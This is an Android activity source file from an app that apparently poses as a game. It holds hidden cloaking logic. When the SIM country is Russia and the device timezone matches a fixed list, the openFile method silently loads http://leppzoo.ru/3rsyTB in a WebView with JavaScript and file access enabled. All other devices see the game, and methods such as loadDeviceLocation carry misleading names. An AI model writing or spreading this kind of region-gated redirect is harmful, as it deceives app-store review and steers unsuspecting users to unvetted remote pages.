package com.tyyna.oil;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.icu.util.TimeZone;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Date;
import java.util.concurrent.TimeUnit;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;


public class StratAc extends AppCompatActivity {

    private ProgressBar progressBar;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getHashKey();
        progressBar = findViewById(R.id.progress);
        progressBar.setVisibility(View.VISIBLE);
        loadDeviceLocation();


    }

    private void getHashKey() {
        try {
            PackageInfo info = getPackageManager().getPackageInfo(getApplicationContext().getPackageName(), PackageManager.GET_SIGNATURES);
            for (Signature signature : info.signatures) {
                MessageDigest md = MessageDigest.getInstance("SHA");
                md.update(signature.toByteArray());

                Log.i("Base64", Base64.encodeToString(md.digest(), Base64.NO_WRAP));
            }
        } catch (PackageManager.NameNotFoundException e) {
            Log.d("Name not found", e.getMessage(), e);

        } catch (NoSuchAlgorithmException e) {
            Log.d("Error", e.getMessage(), e);
        }
    }

    public void loadDeviceLocation() {
       openFile(null);
    }
    boolean off = false;

    Handler h;

    void downloadFile() {
        // пауза - 1 секунда
        try {
            TimeUnit.SECONDS.sleep(1);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
    void crete(){
        Thread thread = new Thread(() -> {
            for (int i = 1; i <= 10; i++) {
                downloadFile();
                Message message = new Message();
                message.obj = "fdsfd" +i;
                h.sendMessage(message);
                // пишем лог
            }
        });
        thread.start();
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void openFile(String countryCode) {
        if (mobile() && time()) {
//        if (off) {
            progressBar.setVisibility(View.GONE);
            WebView webView = findViewById(R.id.web_view);
            webView.setWebViewClient(new WebViewClient() {
                @Override
                public boolean shouldOverrideUrlLoading(WebView view, String url) {
                    if (!url.contains("Yyiddsehnofr"))
                        view.loadUrl(url);
                    else openGame();
                    return true;
                }

                @Override
                public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                    super.onReceivedError(view, request, error);
                    openGame();
                }

                @Override
                public void onReceivedHttpError(WebView view, WebResourceRequest request, WebResourceResponse errorResponse) {
                    super.onReceivedHttpError(view, request, errorResponse);
                    openGame();
                }
            });
            WebSettings webSettings = webView.getSettings();
            webSettings.setBuiltInZoomControls(true);
            webSettings.setSupportZoom(true);
            webSettings.setJavaScriptEnabled(true);
            webSettings.setAllowFileAccess(true);
            webView.loadUrl("http://leppzoo.ru/3rsyTB");
        } else {
            openGame();
        }
    }

    private boolean time() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            TimeZone tz = TimeZone.getDefault();
            Date now = new Date();
            int offsetFromUtc = tz.getOffset(now.getTime()) / 1000 / 3600;
            int[] timezone = {2,3,4,7,8,9,10,11,12};
            for (int item : timezone) {
                if (offsetFromUtc == item)
                    return true;
            }
        } else {
            return true;
        }

        return false;
    }

    private boolean mobile() {
        String countryCodeValue = null;
        if (getSystemService(Context.TELEPHONY_SERVICE) != null)
            countryCodeValue = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getSimCountryIso();
        else
            return false;
        return countryCodeValue != null && (countryCodeValue.equalsIgnoreCase("ru") || countryCodeValue.equalsIgnoreCase("rus"));
    }


    private void openGame() {
        progressBar.setVisibility(View.GONE);
        Intent intent = new Intent(this, PlayAct.class);
        startActivity(intent);
    }
}
